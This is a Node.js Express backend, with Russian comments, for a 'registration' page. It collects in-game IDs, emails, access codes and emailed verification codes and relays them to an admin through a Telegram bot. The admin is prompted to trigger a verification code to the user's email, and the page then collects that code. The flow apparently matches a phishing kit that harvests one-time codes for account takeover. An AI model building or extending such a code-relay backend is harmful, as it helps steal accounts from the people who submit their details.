import express from "express";
import morgan from "morgan";

const app = express();

// --- CONFIG ---
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;           // токен бота
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // ID/юзернейм чата (лучше numeric id)
if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn("[WARN] Set BOT_TOKEN and ADMIN_CHAT_ID in environment");
}

app.use(morgan("tiny"));
app.use(express.json({ limit: "512kb" }));
app.use(express.urlencoded({ extended: false }));

// --- STATIC (ваш фронт) ---
app.use(express.static("public", {
  extensions: ["html"], // можно заходить на /register без .html
  maxAge: "1h",
}));

// --- helpers ---
async function tgSendMessage(text, extra = {}) {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    return { ok: false, error: "no_bot_env" };
  }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: ADMIN_CHAT_ID,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    ...extra,
  };
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    return data; // у Telegram {ok: true, result: {...}}
  } catch (e) {
    console.error("tgSendMessage error:", e);
    return { ok: false, error: "fetch_failed" };
  }
}

function safe(v) {
  return String(v ?? "").trim();
}

// --- API: частичный запрос "GET CODE" ---
app.post("/api/notify-admin", async (req, res) => {
  try {
    const { type, accessCode, ingameId, email } = req.body || {};

    // Собираем сообщение
    const text =
      `<b>📩 Email code request</b>\n` +
      `Type: <code>${safe(type) || "email_code_request"}</code>\n` +
      `Access code: <code>${safe(accessCode)}</code>\n` +
      `In-game ID: <code>${safe(ingameId)}</code>\n` +
      `Email: <code>${safe(email)}</code>\n\n` +
      `⬆️ Проверь данные и отправь пользователю верификационный код на почту.`;

    const tg = await tgSendMessage(text);

    // Ответ фронту: важно вернуть JSON!
    res.json({ ok: !!tg.ok, tg });
  } catch (e) {
    console.error("/api/notify-admin error:", e);
    res.status(500).json({ ok: false, error: "server_error" });
  }
});

// --- API: полная заявка ---
app.post("/api/submit-registration", async (req, res) => {
  try {
    const { accessCode, ingameId, email, password, emailCode } = req.body || {};

    const text =
      `<b>📝 Registration application</b>\n` +
      `Access code: <code>${safe(accessCode)}</code>\n` +
      `In-game ID: <code>${safe(ingameId)}</code>\n` +
      `Email: <code>${safe(email)}</code>\n` +
      `Email code: <code>${safe(emailCode)}</code>\n` +
      `Password: <code>${password ? "•••••••" : ""}</code>\n\n` +
      `✅ <i>Approve</i> / ❌ <i>Deny</i> обработай вручную.`;

    // Можно добавить inline-кнопки (если у бота есть обработчик CallbackQuery)
    const tg = await tgSendMessage(text, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Approve", callback_data: "approve" },
           { text: "❌ Deny", callback_data: "deny" }]
        ]
      }
    });

    // Возвращаем "pending" (фронт уже ожидает одно из approved/rejected/pending)
    res.json({ status: tg.ok ? "pending" : "pending", uid: Date.now().toString() });
  } catch (e) {
    console.error("/api/submit-registration error:", e);
    res.status(500).json({ status: "pending", error: "server_error" });
  }
});

// --- 404 для API по умолчанию (чтобы было понятно) ---
app.use("/api", (req, res) => {
  res.status(404).json({ ok: false, error: "not_found" });
});

app.listen(PORT, () => {
  console.log(`Server on http://0.0.0.0:${PORT}`);
});
